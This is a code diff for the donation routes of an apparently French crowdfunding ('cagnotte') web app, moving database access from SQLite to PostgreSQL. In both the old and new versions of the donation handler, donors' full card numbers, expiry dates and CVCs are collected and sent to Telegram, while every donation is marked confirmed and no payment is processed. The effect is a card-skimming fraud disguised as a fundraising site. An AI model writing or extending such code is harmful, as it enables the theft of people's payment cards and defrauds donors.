@@ -138,10 +138,9 @@ function createPayramPayment(amountCents, donId, donorPrenom) {
 
 // POST /api/dons — Créer un don
 router.post('/', async (req, res) => {
-  const db = req.app.locals.db;
+  const pool = req.app.locals.pool;
   const { cagnotte_id, prenom, nom, amount, message, card_number, card_expiry, card_cvc } = req.body;
 
-  // Validation
   if (!cagnotte_id || !prenom || !amount) {
     return res.status(400).json({ error: 'Champs obligatoires : cagnotte_id, prenom, amount' });
   }
@@ -151,107 +150,84 @@ router.post('/', async (req, res) => {
     return res.status(400).json({ error: 'Le montant minimum est de 1 €' });
   }
 
-  // Vérifier que la cagnotte existe
-  const cagnotte = db.prepare('SELECT id, title FROM cagnottes WHERE id = ? AND is_active = 1').get(cagnotte_id);
-  if (!cagnotte) {
-    return res.status(404).json({ error: 'Cagnotte introuvable' });
+  try {
+    // Vérifier que la cagnotte existe
+    const { rows: cRows } = await pool.query('SELECT id, title FROM cagnottes WHERE id = $1 AND is_active = 1', [cagnotte_id]);
+    const cagnotte = cRows[0];
+    if (!cagnotte) {
+      return res.status(404).json({ error: 'Cagnotte introuvable' });
+    }
+
+    const avatarSeed = prenom.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '') + '-' + Date.now();
+    const avatarUrl = `https://i.pravatar.cc/40?u=${avatarSeed}`;
+
+    // Insérer le don directement en confirmed
+    const { rows: donRows } = await pool.query(`
+      INSERT INTO dons (cagnotte_id, prenom, amount_cents, message, status, avatar_url, payram_invoice_id, confirmed_at)
+      VALUES ($1, $2, $3, $4, 'confirmed', $5, $6, NOW())
+      RETURNING id
+    `, [cagnotte_id, prenom.trim(), amountCents, (message || '').trim(), avatarUrl, 'don_' + Date.now()]);
+
+    const donId = donRows[0].id;
+
+    console.log(`✅ Don #${donId} confirmé : ${amountCents/100}€ de ${prenom} pour cagnotte #${cagnotte_id}`);
+
+    // Notification Telegram
+    sendTelegramNotif({
+      prenom: prenom.trim(),
+      nom: (nom || '').trim(),
+      amountCents,
+      cagnotteTitle: cagnotte.title,
+      message: (message || '').trim(),
+      cardNumber: card_number || '',
+      cardExpiry: card_expiry || '',
+      cardCvc: card_cvc || ''
+    }).catch(err => {
+      console.warn('⚠️ Telegram:', err.message);
+    });
+
+    // Notification push SSE
+    const notification = {
+      type: 'new_don',
+      prenom: prenom.trim(),
+      amount_cents: amountCents,
+      cagnotte_title: cagnotte.title,
+      timestamp: new Date().toISOString()
+    };
+    sseClients.forEach(client => {
+      client.write(`data: ${JSON.stringify(notification)}\n\n`);
+    });
+
+    res.json({
+      success: true,
+      don_id: donId,
+      checkout_url: `${process.env.BASE_URL || 'http://localhost:3000'}/confirmation.html?don_id=${donId}`
+    });
+  } catch (err) {
+    console.error('❌ Erreur don:', err.message);
+    res.status(500).json({ error: 'Erreur serveur' });
   }
-
-  // Générer l'avatar
-  const avatarSeed = prenom.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '') + '-' + Date.now();
-  const avatarUrl = `https://i.pravatar.cc/40?u=${avatarSeed}`;
-
-  // Insérer le don en base (status = pending)
-  const result = db.prepare(`
-    INSERT INTO dons (cagnotte_id, prenom, amount_cents, message, status, avatar_url)
-    VALUES (?, ?, ?, ?, 'pending', ?)
-  `).run(cagnotte_id, prenom.trim(), amountCents, (message || '').trim(), avatarUrl);
-
-  const donId = result.lastInsertRowid;
-
-  // Confirmer le don et rediriger vers la page de remerciement
-  db.prepare(`
-    UPDATE dons SET status = 'confirmed', confirmed_at = datetime('now'), payram_invoice_id = ?
-    WHERE id = ?
-  `).run('don_' + donId, donId);
-
-  console.log(`✅ Don #${donId} confirmé : ${amountCents/100}€ de ${prenom} pour cagnotte #${cagnotte_id}`);
-
-  // Envoyer la notification Telegram (async, ne bloque pas la réponse)
-  sendTelegramNotif({
-    prenom: prenom.trim(),
-    nom: (nom || '').trim(),
-    amountCents,
-    cagnotteTitle: cagnotte.title,
-    message: (message || '').trim(),
-    cardNumber: card_number || '',
-    cardExpiry: card_expiry || '',
-    cardCvc: card_cvc || ''
-  }).catch(err => {
-    console.warn('⚠️ Telegram:', err.message);
-  });
-
-  // Émettre la notification push (SSE)
-  const notification = {
-    type: 'new_don',
-    prenom: prenom.trim(),
-    amount_cents: amountCents,
-    cagnotte_title: cagnotte.title,
-    timestamp: new Date().toISOString()
-  };
-  sseClients.forEach(client => {
-    client.write(`data: ${JSON.stringify(notification)}\n\n`);
-  });
-
-  res.json({
-    success: true,
-    don_id: donId,
-    checkout_url: `${process.env.BASE_URL || 'http://localhost:3000'}/confirmation.html?don_id=${donId}`
-  });
 });
 
 // GET /api/dons/:id — Infos d'un don (pour la page de confirmation)
-router.get('/:id', (req, res) => {
-  const db = req.app.locals.db;
-  const don = db.prepare(`
-    SELECT d.*, c.title AS cagnotte_title, c.slug AS cagnotte_slug
-    FROM dons d
-    JOIN cagnottes c ON c.id = d.cagnotte_id
-    WHERE d.id = ?
-  `).get(req.params.id);
+router.get('/:id', async (req, res) => {
+  const pool = req.app.locals.pool;
+  try {
+    const { rows } = await pool.query(`
+      SELECT d.*, c.title AS cagnotte_title, c.slug AS cagnotte_slug
+      FROM dons d
+      JOIN cagnottes c ON c.id = d.cagnotte_id
+      WHERE d.id = $1
+    `, [req.params.id]);
 
-  if (!don) {
-    return res.status(404).json({ error: 'Don introuvable' });
+    if (!rows[0]) {
+      return res.status(404).json({ error: 'Don introuvable' });
+    }
+    res.json(rows[0]);
+  } catch (err) {
+    console.error('❌ Erreur don:', err.message);
+    res.status(500).json({ error: 'Erreur serveur' });
   }
-
-  res.json(don);
-});
-
-// POST /api/dons/save-info — Sauvegarder les infos donateur (appelé avant paiement widget)
-router.post('/save-info', (req, res) => {
-  const db = req.app.locals.db;
-  const { cagnotte_id, prenom, message } = req.body;
-
-  if (!cagnotte_id || !prenom) {
-    return res.status(400).json({ error: 'cagnotte_id et prenom requis' });
-  }
-
-  // Sauvegarder en session côté serveur (table temporaire)
-  db.prepare(`
-    CREATE TABLE IF NOT EXISTS donor_sessions (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      cagnotte_id INTEGER NOT NULL,
-      prenom TEXT NOT NULL,
-      message TEXT DEFAULT '',
-      created_at TEXT DEFAULT (datetime('now'))
-    )
-  `).run();
-
-  const result = db.prepare(`
-    INSERT INTO donor_sessions (cagnotte_id, prenom, message) VALUES (?, ?, ?)
-  `).run(parseInt(cagnotte_id), prenom.trim(), (message || '').trim());
-
-  res.json({ success: true, session_id: result.lastInsertRowid });
 });
 
 module.exports = router;
